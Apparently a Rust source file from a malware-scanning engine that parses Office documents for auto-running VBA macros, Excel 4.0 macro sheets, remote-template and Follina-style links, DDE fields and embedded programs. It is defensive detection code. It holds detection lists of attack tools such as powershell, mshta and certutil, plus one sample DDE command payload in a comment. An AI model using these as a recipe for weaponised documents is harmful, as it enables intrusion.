//! Office document analysis: macros, Excel 4.0 macro sheets, remote templates,
//! DDE and embedded objects.
//!
//! The generic engines read a document's raw bytes, and in an Office file the
//! dangerous parts are hidden from them: VBA source is stored compressed
//! ([MS-OVBA]), Excel 4.0 formulas are tokenised, and a `.docx` is a zip
//! whose parts the archive unpacker deliberately leaves alone. This analyzer
//! opens the document's real structure:
//!
//! - **OLE files** (`.doc`, `.xls`, `.ppt`, and `vbaProject.bin` inside the
//!   newer formats): every VBA project is found, its `dir` stream parsed and
//!   each module's source decompressed. `.xls` workbooks are also walked
//!   record by record for Excel 4.0 macro sheets and an `Auto_Open` name.
//! - **OOXML files** (`.docx`, `.xlsm`, `.pptm`, ...): `vbaProject.bin`,
//!   `xl/macrosheets/`, relationships pointing outside the document (remote
//!   template injection, the `ms-msdt:` Follina links), DDE fields and
//!   embedded OLE objects.
//!
//! Macro source is scored the way analysts read it: code that runs by itself
//! when the document opens, and that downloads or launches something, is
//! malicious. Macros on their own are not: plenty of real spreadsheets have
//! them.
//!
//! Everything here reads hostile input, so every read is size-capped and the
//! parse runs under `catch_unwind`: a malformed file produces "could not be
//! parsed", never a crash.
//!
//! [MS-OVBA]: https://learn.microsoft.com/openspecs/office_file_formats/ms-ovba

use std::collections::BTreeSet;
use std::io::{Cursor, Read, Seek};

use chrono::Utc;
use regex::Regex;
use serde::Serialize;
use std::collections::HashMap;
use uuid::Uuid;

use crate::models::analysis_result::{
    DetectionResult, EngineType, SeverityLevel, ThreatCategory, ThreatVerdict, STRONG_SIGNAL_KEY,
};

pub const ENGINE_NAME: &str = "Office Document Analyzer";
const ENGINE_VERSION: &str = "1.0.0";

const OLE_MAGIC: &[u8] = &[0xD0, 0xCF, 0x11, 0xE0, 0xA1, 0xB1, 0x1A, 0xE1];
const ZIP_MAGIC: &[u8] = b"PK\x03\x04";

/// Largest stream or zip part read from a document.
const MAX_PART_BYTES: u64 = 16 * 1024 * 1024;
/// Largest decompressed VBA module or `dir` stream.
const MAX_DECOMPRESSED: usize = 8 * 1024 * 1024;
/// VBA projects inspected in one document (embedded documents can nest).
const MAX_PROJECTS: usize = 8;
/// Zip parts inspected in one OOXML document.
const MAX_OOXML_PARTS: usize = 2_000;
/// OLE objects embedded in an OOXML document that are opened.
const MAX_EMBEDDED_OBJECTS: usize = 16;
/// Characters of each module's source kept in the report.
const SOURCE_PREVIEW_CHARS: usize = 3_000;

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "lowercase")]
pub enum OfficeFormat {
    /// OLE2 compound file: .doc, .xls, .ppt, .msg, vbaProject.bin.
    Ole,
    /// Office Open XML: .docx, .docm, .xlsx, .xlsm, .pptx, .pptm.
    Ooxml,
}

/// The Office format of `data`, if it is one.
pub fn detect(data: &[u8]) -> Option<OfficeFormat> {
    if data.starts_with(OLE_MAGIC) {
        return Some(OfficeFormat::Ole);
    }
    if data.starts_with(ZIP_MAGIC) {
        let archive = zip::ZipArchive::new(Cursor::new(data)).ok()?;
        let is_ooxml = archive.index_for_name("[Content_Types].xml").is_some();
        return is_ooxml.then_some(OfficeFormat::Ooxml);
    }
    None
}

#[derive(Debug, Clone, Serialize)]
pub struct MacroModule {
    /// Where the project was found, e.g. `/Macros/VBA` or `word/vbaProject.bin`.
    pub project: String,
    pub module: String,
    pub lines: usize,
    pub bytes: usize,
    /// The start of the decompressed source.
    pub preview: String,
}

#[derive(Debug, Clone, PartialEq, Eq, PartialOrd, Ord, Serialize)]
pub struct Indicator {
    /// "autoexec", "execute", "download", "drop", "inject", "obfuscation".
    pub kind: &'static str,
    pub keyword: String,
    pub description: &'static str,
}

#[derive(Debug, Clone, Serialize)]
pub struct ExternalLink {
    pub part: String,
    /// The relationship type's last segment, e.g. `attachedTemplate`.
    pub relationship: String,
    pub target: String,
    pub dangerous: bool,
    pub reason: String,
}

#[derive(Debug, Clone, Default, Serialize)]
pub struct XlmInfo {
    pub macro_sheets: Vec<String>,
    pub hidden_sheets: Vec<String>,
    pub auto_open: bool,
    /// Excel 4.0 functions that run code or reach the network.
    pub dangerous_functions: Vec<String>,
}

#[derive(Debug, Clone, Serialize)]
pub struct EmbeddedObject {
    pub location: String,
    /// Packager (`Ole10Native`) label or file name, when present.
    pub name: Option<String>,
    pub executable: bool,
}

/// Everything the analyzer found in one document.
#[derive(Debug, Clone, Serialize)]
pub struct OfficeReport {
    pub format: OfficeFormat,
    pub encrypted: bool,
    pub macros: Vec<MacroModule>,
    pub indicators: Vec<Indicator>,
    pub iocs: Vec<String>,
    pub external_links: Vec<ExternalLink>,
    pub dde: Vec<String>,
    pub xlm: XlmInfo,
    pub embedded_objects: Vec<EmbeddedObject>,
    /// Parts that could not be read, with the reason.
    pub errors: Vec<String>,
    /// Full module sources, scored once parsing is done. Only previews are
    /// reported.
    #[serde(skip)]
    sources: Vec<String>,
}

impl OfficeReport {
    fn new(format: OfficeFormat) -> Self {
        Self {
            format,
            encrypted: false,
            macros: Vec::new(),
            indicators: Vec::new(),
            iocs: Vec::new(),
            external_links: Vec::new(),
            dde: Vec::new(),
            xlm: XlmInfo::default(),
            embedded_objects: Vec::new(),
            errors: Vec::new(),
            sources: Vec::new(),
        }
    }

    fn has(&self, kind: &str) -> bool {
        self.indicators.iter().any(|i| i.kind == kind)
    }
}

/// Analyse `data` if it is an Office document. `None` for anything else, so
/// other files don't grow an engine with nothing to say.
pub fn analyze(data: &[u8]) -> Option<DetectionResult> {
    let format = detect(data)?;
    let started = std::time::Instant::now();
    let parsed = std::panic::catch_unwind(|| inspect(data, format));
    let report = match parsed {
        Ok(report) => report,
        Err(_) => {
            let mut report = OfficeReport::new(format);
            report
                .errors
                .push("document structure could not be parsed".to_string());
            report
        }
    };
    Some(detection(&report, started.elapsed().as_millis() as u64))
}

/// Parse the document into a report.
pub fn inspect(data: &[u8], format: OfficeFormat) -> OfficeReport {
    let mut report = OfficeReport::new(format);
    match format {
        OfficeFormat::Ole => inspect_ole(data, "", &mut report),
        OfficeFormat::Ooxml => inspect_ooxml(data, &mut report),
    }
    score_macros(&mut report);
    report
}

// ── Verdict ──────────────────────────────────────────────────────────────

struct Assessment {
    verdict: ThreatVerdict,
    severity: SeverityLevel,
    confidence: f32,
    strong: bool,
    reasons: Vec<String>,
}

fn assess(r: &OfficeReport) -> Assessment {
    let mut reasons = Vec::new();
    let autoexec = r.has("autoexec");
    let execute = r.has("execute");
    let download = r.has("download");
    let inject = r.has("inject");
    let drop = r.has("drop");
    let obfuscated = r.has("obfuscation");
    let dangerous_link = r.external_links.iter().any(|l| l.dangerous);
    let dde_command = r.dde.iter().any(|d| dde_runs_command(d));
    let executable_object = r.embedded_objects.iter().any(|o| o.executable);
    let xlm_auto = !r.xlm.macro_sheets.is_empty() && r.xlm.auto_open;
    let xlm_dangerous = !r.xlm.dangerous_functions.is_empty();

    // Malicious: code that runs on open and reaches out, or a document
    // feature that has no use except fetching and running code.
    let mut malicious = false;
    if autoexec && (execute || download || inject) {
        malicious = true;
        reasons.push("macro runs when the document opens and downloads or launches code".into());
    }
    if download && execute {
        malicious = true;
        reasons.push("macro both downloads and launches code".into());
    }
    if inject && (autoexec || execute) {
        malicious = true;
        reasons.push("macro calls Windows memory APIs used to inject code".into());
    }
    if dangerous_link {
        malicious = true;
        reasons.push("document loads remote content through an external relationship".into());
    }
    if dde_command {
        malicious = true;
        reasons.push("DDE field launches a command".into());
    }
    if xlm_auto && (xlm_dangerous || !r.xlm.hidden_sheets.is_empty()) {
        malicious = true;
        reasons.push("Excel 4.0 macro sheet runs on open".into());
    }
    if malicious {
        return Assessment {
            verdict: ThreatVerdict::Malicious,
            severity: SeverityLevel::High,
            confidence: 0.9,
            strong: true,
            reasons,
        };
    }

    // Suspicious: one dangerous capability, or hiding.
    if execute || download || inject {
        reasons.push("macro can download or launch code".into());
    }
    if autoexec && (obfuscated || drop) {
        reasons.push("macro runs on open and is obfuscated or writes files".into());
    }
    if executable_object {
        reasons.push("document embeds a program or script".into());
    }
    if !r.dde.is_empty() {
        reasons.push("document contains a DDE field".into());
    }
    if !r.xlm.macro_sheets.is_empty() {
        reasons.push("document contains an Excel 4.0 macro sheet".into());
    }
    if !reasons.is_empty() {
        return Assessment {
            verdict: ThreatVerdict::Suspicious,
            severity: SeverityLevel::Medium,
            confidence: 0.7,
            strong: false,
            reasons,
        };
    }

    if r.encrypted {
        return Assessment {
            verdict: ThreatVerdict::Unknown,
            severity: SeverityLevel::Info,
            confidence: 0.0,
            strong: false,
            reasons: vec!["document is encrypted, so its contents can't be inspected".into()],
        };
    }
    if !r.errors.is_empty() && r.macros.is_empty() {
        return Assessment {
            verdict: ThreatVerdict::Unknown,
            severity: SeverityLevel::Info,
            confidence: 0.0,
            strong: false,
            reasons: vec![format!("could not be inspected: {}", r.errors.join("; "))],
        };
    }

    let note = if r.macros.is_empty() {
        "no macros, external links, DDE or embedded programs".to_string()
    } else {
        format!(
            "{} macro module(s), none that downloads, launches or injects code",
            r.macros.len()
        )
    };
    Assessment {
        verdict: ThreatVerdict::Benign,
        severity: SeverityLevel::Info,
        confidence: 0.75,
        strong: false,
        reasons: vec![note],
    }
}

fn detection(r: &OfficeReport, processing_time_ms: u64) -> DetectionResult {
    let a = assess(r);
    let mut metadata = HashMap::new();
    let mut put = |k: &str, v: serde_json::Value| {
        metadata.insert(k.to_string(), v);
    };
    put("format", serde_json::json!(r.format));
    put("encrypted", serde_json::json!(r.encrypted));
    put("summary", serde_json::json!(a.reasons.join("; ")));
    put("macroModules", serde_json::json!(r.macros));
    put("indicators", serde_json::json!(r.indicators));
    put("iocs", serde_json::json!(r.iocs));
    put("externalLinks", serde_json::json!(r.external_links));
    put("dde", serde_json::json!(r.dde));
    put("excel4Macros", serde_json::json!(r.xlm));
    put("embeddedObjects", serde_json::json!(r.embedded_objects));
    if !r.errors.is_empty() {
        put("parseErrors", serde_json::json!(r.errors));
    }
    put(STRONG_SIGNAL_KEY, serde_json::json!(a.strong));
    if a.verdict == ThreatVerdict::Unknown {
        put("status", serde_json::json!("unavailable"));
        put("reason", serde_json::json!(a.reasons.join("; ")));
    }

    DetectionResult {
        detection_id: Uuid::new_v4(),
        engine_name: ENGINE_NAME.to_string(),
        engine_version: ENGINE_VERSION.to_string(),
        engine_type: EngineType::Static,
        categories: match a.verdict {
            ThreatVerdict::Malicious | ThreatVerdict::Suspicious => {
                vec![ThreatCategory::Malware]
            }
            _ => vec![],
        },
        error_message: (a.verdict == ThreatVerdict::Unknown).then(|| a.reasons.join("; ")),
        verdict: a.verdict,
        confidence: a.confidence,
        severity: a.severity,
        metadata,
        detected_at: Utc::now(),
        processing_time_ms: processing_time_ms.max(1),
    }
}

// ── OLE ──────────────────────────────────────────────────────────────────

fn inspect_ole(data: &[u8], location: &str, report: &mut OfficeReport) {
    let mut cf = match cfb::CompoundFile::open(Cursor::new(data)) {
        Ok(cf) => cf,
        Err(e) => {
            report
                .errors
                .push(format!("{}: not a readable OLE file: {e}", label(location)));
            return;
        }
    };

    let entries: Vec<(String, bool)> = cf
        .walk()
        .map(|e| (e.path().to_string_lossy().into_owned(), e.is_stream()))
        .collect();

    // Encrypted OOXML is stored as an OLE file holding EncryptionInfo.
    if entries
        .iter()
        .any(|(p, s)| *s && (p == "/EncryptionInfo" || p == "/EncryptedPackage"))
    {
        report.encrypted = true;
    }

    // Every VBA project: a storage named VBA that holds a `dir` stream.
    let projects: Vec<String> = entries
        .iter()
        .filter(|(p, s)| *s && p.to_ascii_lowercase().ends_with("/vba/dir"))
        .map(|(p, _)| p[..p.len() - "/dir".len()].to_string())
        .take(MAX_PROJECTS)
        .collect();
    for vba in projects {
        read_vba_project(&mut cf, &vba, location, report);
    }

    // Excel 97-2003 workbook stream: macro sheets and encryption.
    for name in ["/Workbook", "/Book"] {
        if entries.iter().any(|(p, s)| *s && p == name) {
            if let Some(stream) = read_stream(&mut cf, name) {
                inspect_biff(&stream, report);
            }
            break;
        }
    }

    // Packager objects: a file dropped into the document.
    for (path, is_stream) in &entries {
        if *is_stream && path.ends_with("\u{1}Ole10Native") {
            if let Some(stream) = read_stream(&mut cf, path) {
                let name = ole10native_name(&stream);
                report.embedded_objects.push(EmbeddedObject {
                    location: format!("{}{path}", prefix(location)),
                    executable: name.as_deref().is_some_and(is_executable_name),
                    name,
                });
            }
        }
    }
}

fn read_stream<F: Read + Seek>(cf: &mut cfb::CompoundFile<F>, path: &str) -> Option<Vec<u8>> {
    let mut stream = cf.open_stream(path).ok()?;
    let mut buf = Vec::new();
    (&mut stream)
        .take(MAX_PART_BYTES)
        .read_to_end(&mut buf)
        .ok()?;
    Some(buf)
}

fn read_vba_project<F: Read + Seek>(
    cf: &mut cfb::CompoundFile<F>,
    vba: &str,
    location: &str,
    report: &mut OfficeReport,
) {
    let project = format!("{}{vba}", prefix(location));
    let Some(dir_raw) = read_stream(cf, &format!("{vba}/dir")) else {
        report
            .errors
            .push(format!("{project}: dir stream unreadable"));
        return;
    };
    let Some(dir) = decompress(&dir_raw) else {
        report
            .errors
            .push(format!("{project}: dir stream is not valid MS-OVBA"));
        return;
    };
    let modules = parse_dir(&dir);
    if modules.is_empty() {
        report.errors.push(format!("{project}: no modules listed"));
    }
    for m in modules {
        let path = format!("{vba}/{}", m.stream);
        let Some(raw) = read_stream(cf, &path) else {
            report
                .errors
                .push(format!("{project}: module stream {} missing", m.stream));
            continue;
        };
        let Some(compressed) = raw.get(m.offset as usize..) else {
            report
                .errors
                .push(format!("{project}: module {} offset out of range", m.name));
            continue;
        };
        let Some(source) = decompress(compressed) else {
            report
                .errors
                .push(format!("{project}: module {} source corrupt", m.name));
            continue;
        };
        // An uncompressed final chunk is padded to 4096 bytes with NULs.
        let text = String::from_utf8_lossy(&source)
            .trim_end_matches('\0')
            .to_string();
        report.macros.push(MacroModule {
            project: project.clone(),
            module: m.name,
            lines: text.lines().count(),
            bytes: text.len(),
            preview: text.chars().take(SOURCE_PREVIEW_CHARS).collect(),
        });
        report.sources.push(text);
    }
}

fn label(location: &str) -> &str {
    if location.is_empty() {
        "document"
    } else {
        location
    }
}

fn prefix(location: &str) -> String {
    if location.is_empty() {
        String::new()
    } else {
        format!("{location}:")
    }
}

/// [MS-OVBA] 2.4.1: decompress a CompressedContainer. `None` if it isn't
/// one. Output is capped at [`MAX_DECOMPRESSED`].
pub fn decompress(container: &[u8]) -> Option<Vec<u8>> {
    if container.first() != Some(&0x01) {
        return None;
    }
    let mut out: Vec<u8> = Vec::new();
    let mut pos = 1;
    while pos + 2 <= container.len() {
        let header = u16::from_le_bytes([container[pos], container[pos + 1]]);
        let chunk_end = (pos + (header & 0x0FFF) as usize + 3).min(container.len());
        let compressed = header & 0x8000 != 0;
        pos += 2;
        let chunk_start = out.len();

        if !compressed {
            let end = (pos + 4096).min(chunk_end);
            out.extend_from_slice(&container[pos..end]);
            pos = chunk_end;
        } else {
            while pos < chunk_end {
                let flags = container[pos];
                pos += 1;
                for bit in 0..8 {
                    if pos >= chunk_end {
                        break;
                    }
                    if flags & (1 << bit) == 0 {
                        out.push(container[pos]);
                        pos += 1;
                        continue;
                    }
                    if pos + 2 > chunk_end {
                        return None;
                    }
                    let token = u16::from_le_bytes([container[pos], container[pos + 1]]);
                    pos += 2;
                    let difference = out.len() - chunk_start;
                    let mut bit_count = 4;
                    while (1usize << bit_count) < difference {
                        bit_count += 1;
                    }
                    let bit_count = bit_count.min(12);
                    let length_mask: u16 = 0xFFFF >> bit_count;
                    let length = (token & length_mask) as usize + 3;
                    let offset = (token >> (16 - bit_count)) as usize + 1;
                    if offset > difference {
                        return None;
                    }
                    for _ in 0..length {
                        let b = out[out.len() - offset];
                        out.push(b);
                    }
                }
                if out.len() - chunk_start > 4096 {
                    return None;
                }
            }
        }
        if out.len() > MAX_DECOMPRESSED {
            return None;
        }
    }
    Some(out)
}

#[derive(Debug, Clone, PartialEq)]
struct DirModule {
    name: String,
    stream: String,
    offset: u32,
}

/// [MS-OVBA] 2.3.4.2: the module records of a decompressed `dir` stream.
fn parse_dir(dir: &[u8]) -> Vec<DirModule> {
    let mut modules = Vec::new();
    let mut name = String::new();
    let mut stream = String::new();
    let mut stream_unicode = String::new();
    let mut offset = 0u32;
    let mut pos = 0;
    while pos + 6 <= dir.len() {
        let id = u16::from_le_bytes([dir[pos], dir[pos + 1]]);
        let size =
            u32::from_le_bytes([dir[pos + 2], dir[pos + 3], dir[pos + 4], dir[pos + 5]]) as usize;
        pos += 6;
        // PROJECTVERSION's size field says 4 but 6 bytes follow.
        let size = if id == 0x0009 { 6 } else { size };
        let Some(body) = dir.get(pos..pos + size) else {
            break;
        };
        pos += size;
        match id {
            0x0019 => {
                name = String::from_utf8_lossy(body).into_owned();
                stream.clear();
                stream_unicode.clear();
                offset = 0;
            }
            0x001A => stream = String::from_utf8_lossy(body).into_owned(),
            // The Unicode stream name, recorded as the "reserved" 0x0032
            // record that follows MODULESTREAMNAME.
            0x0032 => stream_unicode = utf16le(body),
            0x0031 if size >= 4 => {
                offset = u32::from_le_bytes([body[0], body[1], body[2], body[3]]);
            }
            0x002B => {
                let stream_name = if !stream_unicode.is_empty() {
                    stream_unicode.clone()
                } else if !stream.is_empty() {
                    stream.clone()
                } else {
                    name.clone()
                };
                if !stream_name.is_empty() {
                    modules.push(DirModule {
                        name: if name.is_empty() {
                            stream_name.clone()
                        } else {
                            name.clone()
                        },
                        stream: stream_name,
                        offset,
                    });
                }
            }
            _ => {}
        }
    }
    modules
}

fn utf16le(bytes: &[u8]) -> String {
    let units: Vec<u16> = bytes
        .as_chunks::<2>()
        .0
        .iter()
        .map(|c| u16::from_le_bytes(*c))
        .collect();
    String::from_utf16_lossy(&units)
}

/// The label of an `\x01Ole10Native` packager stream: a size, then
/// 2 bytes, then the NUL-terminated label.
fn ole10native_name(stream: &[u8]) -> Option<String> {
    let rest = stream.get(6..)?;
    let end = rest.iter().position(|&b| b == 0)?;
    let name = String::from_utf8_lossy(&rest[..end]).trim().to_string();
    (!name.is_empty()).then_some(name)
}

fn is_executable_name(name: &str) -> bool {
    let lower = name.to_ascii_lowercase();
    [
        ".exe", ".dll", ".scr", ".com", ".pif", ".bat", ".cmd", ".ps1", ".vbs", ".vbe", ".js",
        ".jse", ".wsf", ".wsh", ".hta", ".lnk", ".jar", ".msi", ".cpl", ".reg",
    ]
    .iter()
    .any(|ext| lower.ends_with(ext))
}

// ── Excel 97-2003 (BIFF8) ────────────────────────────────────────────────

/// Walk the workbook's records: BOUNDSHEET8 (sheet type and visibility),
/// built-in names (Auto_Open is name 0x01), FILEPASS (encryption), and the
/// function ids of Excel 4.0 formulas.
fn inspect_biff(stream: &[u8], report: &mut OfficeReport) {
    let mut pos = 0;
    let mut sheets: Vec<(String, u8, u8)> = Vec::new();
    while pos + 4 <= stream.len() {
        let id = u16::from_le_bytes([stream[pos], stream[pos + 1]]);
        let len = u16::from_le_bytes([stream[pos + 2], stream[pos + 3]]) as usize;
        pos += 4;
        let Some(body) = stream.get(pos..pos + len) else {
            break;
        };
        pos += len;
        match id {
            // FILEPASS
            0x002F => report.encrypted = true,
            // BOUNDSHEET8: lbPlyPos(4) hsState(1) dt(1) stName
            0x0085 if body.len() >= 8 => {
                let state = body[4] & 0x03;
                let kind = body[5];
                sheets.push((biff_short_string(&body[6..]), state, kind));
            }
            // LBL: built-in name 0x01 is Auto_Open.
            0x0018 if body.len() >= 15 => {
                let builtin = u16::from_le_bytes([body[0], body[1]]) & 0x0020 != 0;
                let cch = body[3] as usize;
                if builtin && cch >= 1 && body[15..].first() == Some(&0x01) {
                    report.xlm.auto_open = true;
                }
            }
            // FORMULA: scan the parsed expression for dangerous functions.
            0x0006 if body.len() > 22 => scan_xlm_ptgs(&body[22..], &mut report.xlm),
            _ => {}
        }
    }
    for (name, state, kind) in sheets {
        // dt 1 = Excel 4.0 macro sheet.
        if kind == 0x01 {
            report.xlm.macro_sheets.push(name.clone());
            if state != 0 {
                report.xlm.hidden_sheets.push(format!(
                    "{name} ({})",
                    if state == 2 { "very hidden" } else { "hidden" }
                ));
            }
        }
    }
}

/// ShortXLUnicodeString: cch(1) fHighByte(1) chars.
fn biff_short_string(b: &[u8]) -> String {
    let Some(&cch) = b.first() else {
        return String::new();
    };
    let high = b.get(1).is_some_and(|f| f & 1 == 1);
    let chars = b.get(2..).unwrap_or_default();
    if high {
        utf16le(&chars[..(cch as usize * 2).min(chars.len())])
    } else {
        String::from_utf8_lossy(&chars[..(cch as usize).min(chars.len())]).into_owned()
    }
}

/// Function ids (Ftab) of Excel 4.0 functions that run code, load DLLs or
/// fetch files.
const XLM_DANGEROUS: &[(u16, &str)] = &[
    (110, "EXEC"),
    (149, "REGISTER"),
    (150, "CALL"),
    (17, "RUN"),
    (269, "REGISTER.ID"),
];

/// Look through a formula's tokens for ptgFunc/ptgFuncVar calls to
/// [`XLM_DANGEROUS`]. Tokens aren't walked exactly (that needs every ptg's
/// size); the byte pattern of a function token followed by its id is enough
/// and errs towards finding more.
fn scan_xlm_ptgs(rgce: &[u8], xlm: &mut XlmInfo) {
    let mut i = 0;
    while i < rgce.len() {
        let ptg = rgce[i];
        let (id_at, is_func) = match ptg {
            // ptgFunc (ref/value/array classes)
            0x21 | 0x41 | 0x61 => (i + 1, true),
            // ptgFuncVar: argument count, then the id
            0x22 | 0x42 | 0x62 => (i + 2, true),
            _ => (0, false),
        };
        if is_func && id_at + 2 <= rgce.len() {
            let id = u16::from_le_bytes([rgce[id_at], rgce[id_at + 1]]) & 0x7FFF;
            if let Some((_, name)) = XLM_DANGEROUS.iter().find(|(f, _)| *f == id) {
                if !xlm.dangerous_functions.iter().any(|n| n == name) {
                    xlm.dangerous_functions.push(name.to_string());
                }
            }
        }
        i += 1;
    }
}

// ── OOXML ────────────────────────────────────────────────────────────────

fn inspect_ooxml(data: &[u8], report: &mut OfficeReport) {
    let Ok(mut archive) = zip::ZipArchive::new(Cursor::new(data)) else {
        report.errors.push("not a readable zip".to_string());
        return;
    };
    let mut embedded = 0;
    for i in 0..archive.len().min(MAX_OOXML_PARTS) {
        let Ok(entry) = archive.by_index(i) else {
            continue;
        };
        if !entry.is_file() {
            continue;
        }
        let name = entry.name().map(|n| n.to_string()).unwrap_or_default();
        let lower = name.to_ascii_lowercase();
        let wanted = lower.ends_with("vbaproject.bin")
            || lower.ends_with(".rels")
            || lower.starts_with("xl/macrosheets/")
            || (lower.contains("/embeddings/") && lower.ends_with(".bin"))
            || lower == "word/document.xml"
            || lower.starts_with("word/header")
            || lower.starts_with("word/footer")
            || lower.starts_with("xl/worksheets/");
        if !wanted {
            continue;
        }
        let mut buf = Vec::new();
        if entry.take(MAX_PART_BYTES).read_to_end(&mut buf).is_err() {
            report.errors.push(format!("{name}: could not be read"));
            continue;
        }

        if lower.ends_with("vbaproject.bin") {
            inspect_ole(&buf, &name, report);
        } else if lower.ends_with(".rels") {
            inspect_rels(&name, &String::from_utf8_lossy(&buf), report);
        } else if lower.starts_with("xl/macrosheets/") {
            let sheet = name.rsplit('/').next().unwrap_or(&name).to_string();
            report.xlm.macro_sheets.push(sheet);
            inspect_xlm_xml(&String::from_utf8_lossy(&buf), &mut report.xlm);
        } else if lower.contains("/embeddings/") {
            if embedded < MAX_EMBEDDED_OBJECTS && buf.starts_with(OLE_MAGIC) {
                embedded += 1;
                let before = report.embedded_objects.len();
                inspect_ole(&buf, &name, report);
                if report.embedded_objects.len() == before {
                    report.embedded_objects.push(EmbeddedObject {
                        location: name.clone(),
                        name: None,
                        executable: false,
                    });
                }
            }
        } else {
            inspect_dde(&name, &String::from_utf8_lossy(&buf), report);
        }
    }
    // Excel decides visibility in workbook.xml; macro sheets are flagged
    // hidden there with state="hidden" / "veryHidden".
    if !report.xlm.macro_sheets.is_empty() {
        if let Ok(mut wb) = archive.by_name("xl/workbook.xml") {
            let mut buf = Vec::new();
            if (&mut wb).take(MAX_PART_BYTES).read_to_end(&mut buf).is_ok() {
                inspect_workbook_xml(&String::from_utf8_lossy(&buf), &mut report.xlm);
            }
        }
    }
}

lazy_static::lazy_static! {
    static ref REL_RE: Regex = Regex::new(r#"(?is)<Relationship\b([^>]*)/?>"#).unwrap();
    static ref ATTR_RE: Regex = Regex::new(r#"(?is)\b(Type|Target|TargetMode)\s*=\s*"([^"]*)""#).unwrap();
    static ref INSTR_RE: Regex = Regex::new(r#"(?is)<w:instrText[^>]*>([^<]*)</w:instrText>"#).unwrap();
    static ref FLDSIMPLE_RE: Regex = Regex::new(r#"(?is)<w:fldSimple[^>]*w:instr\s*=\s*"([^"]*)""#).unwrap();
    static ref SHEET_RE: Regex = Regex::new(r#"(?is)<sheet\b([^>]*)/?>"#).unwrap();
    static ref NAME_ATTR_RE: Regex = Regex::new(r#"(?is)\b(name|state|r:id)\s*=\s*"([^"]*)""#).unwrap();
    static ref DEFINED_AUTO_RE: Regex = Regex::new(r#"(?is)<definedName[^>]*name\s*=\s*"_xlnm\.Auto_Open[^"]*""#).unwrap();
    static ref URL_RE: Regex = Regex::new(r#"(?i)\b(?:https?|ftp)://[^\s"'<>()]{4,200}"#).unwrap();
    static ref IP_RE: Regex = Regex::new(r#"\b(?:(?:25[0-5]|2[0-4]\d|1?\d?\d)\.){3}(?:25[0-5]|2[0-4]\d|1?\d?\d)\b"#).unwrap();
    static ref EXE_RE: Regex = Regex::new(r#"(?i)\b[\w\-]{1,64}\.(?:exe|dll|scr|ps1|vbs|hta|bat|cmd|jse?)\b"#).unwrap();
    static ref CHR_RE: Regex = Regex::new(r#"(?i)\bChrW?\$?\s*\("#).unwrap();
}

/// External relationships. Remote templates, frames and OLE links are how
/// documents pull a payload at open time without a single macro.
fn inspect_rels(part: &str, xml: &str, report: &mut OfficeReport) {
    for rel in REL_RE.captures_iter(xml) {
        let mut ty = "";
        let mut target = "";
        let mut external = false;
        for a in ATTR_RE.captures_iter(&rel[1]) {
            match &a[1] {
                "Type" => ty = a.get(2).map_or("", |m| m.as_str()),
                "Target" => target = a.get(2).map_or("", |m| m.as_str()),
                "TargetMode" => external = a[2].eq_ignore_ascii_case("External"),
                _ => {}
            }
        }
        if !external {
            continue;
        }
        let relationship = ty.rsplit('/').next().unwrap_or(ty).to_string();
        let t = target.to_ascii_lowercase();
        let (dangerous, reason) = if t.contains("ms-msdt:")
            || t.contains("search-ms:")
            || t.contains("ms-officecmd:")
            || t.starts_with("mhtml:")
            || t.contains("!x-usc:")
        {
            (
                true,
                "protocol handler used to run code (e.g. Follina, CVE-2022-30190)",
            )
        } else if matches!(
            relationship.as_str(),
            "attachedTemplate" | "oleObject" | "frame" | "subDocument"
        ) && (t.starts_with("http") || t.starts_with("\\\\") || t.starts_with("file:"))
        {
            (
                true,
                "loads a remote template or object when the document opens",
            )
        } else if relationship == "hyperlink" {
            (false, "hyperlink (only followed if clicked)")
        } else {
            (false, "external reference")
        };
        if relationship != "hyperlink" || dangerous {
            report.external_links.push(ExternalLink {
                part: part.to_string(),
                relationship,
                target: target.chars().take(300).collect(),
                dangerous,
                reason: reason.to_string(),
            });
        }
    }
}

fn inspect_dde(part: &str, xml: &str, report: &mut OfficeReport) {
    let mut instr = String::new();
    for c in INSTR_RE.captures_iter(xml) {
        instr.push_str(&c[1]);
    }
    for c in FLDSIMPLE_RE.captures_iter(xml) {
        instr.push(' ');
        instr.push_str(&c[1]);
    }
    // Field codes are split across runs, so look at them joined.
    let upper = instr.to_ascii_uppercase();
    if upper.contains("DDEAUTO") || upper.split_whitespace().any(|w| w == "DDE") {
        let text: String = instr.split_whitespace().collect::<Vec<_>>().join(" ");
        report.dde.push(format!(
            "{part}: {}",
            text.chars().take(300).collect::<String>()
        ));
    }
    // Excel DDE: a formula like =cmd|' /c calc'!A0
    if part.starts_with("xl/") {
        let lower = xml.to_ascii_lowercase();
        for needle in ["cmd|", "powershell|", "mshta|", "msexcel|"] {
            if lower.contains(needle) {
                report.dde.push(format!("{part}: formula calls {needle}"));
            }
        }
    }
}

fn dde_runs_command(field: &str) -> bool {
    let l = field.to_ascii_lowercase();
    [
        "cmd",
        "powershell",
        "mshta",
        "rundll32",
        "regsvr32",
        "certutil",
        "bitsadmin",
        "wscript",
        "cscript",
    ]
    .iter()
    .any(|w| l.contains(w))
}

fn inspect_xlm_xml(xml: &str, xlm: &mut XlmInfo) {
    let upper = xml.to_ascii_uppercase();
    for f in [
        "EXEC(",
        "CALL(",
        "REGISTER(",
        "URLDOWNLOADTOFILE",
        "SHELLEXECUTE",
    ] {
        let name = f.trim_end_matches('(').to_string();
        if upper.contains(f) && !xlm.dangerous_functions.contains(&name) {
            xlm.dangerous_functions.push(name);
        }
    }
}

fn inspect_workbook_xml(xml: &str, xlm: &mut XlmInfo) {
    if DEFINED_AUTO_RE.is_match(xml) {
        xlm.auto_open = true;
    }
    for sheet in SHEET_RE.captures_iter(xml) {
        let mut name = "";
        let mut state = "";
        for a in NAME_ATTR_RE.captures_iter(&sheet[1]) {
            match &a[1] {
                "name" => name = a.get(2).map_or("", |m| m.as_str()),
                "state" => state = a.get(2).map_or("", |m| m.as_str()),
                _ => {}
            }
        }
        if state.eq_ignore_ascii_case("hidden") || state.eq_ignore_ascii_case("veryHidden") {
            xlm.hidden_sheets.push(format!("{name} ({state})"));
        }
    }
}

// ── Macro scoring ────────────────────────────────────────────────────────

/// (kind, keyword, description). Matched case-insensitively against the
/// whole source; `\b`-bounded where the keyword is a word.
const MACRO_KEYWORDS: &[(&str, &str, &str)] = &[
    // Runs without the user doing anything but opening or closing.
    ("autoexec", "AutoOpen", "runs when a Word document opens"),
    ("autoexec", "Auto_Open", "runs when a workbook opens"),
    (
        "autoexec",
        "Document_Open",
        "runs when a Word document opens",
    ),
    (
        "autoexec",
        "DocumentOpen",
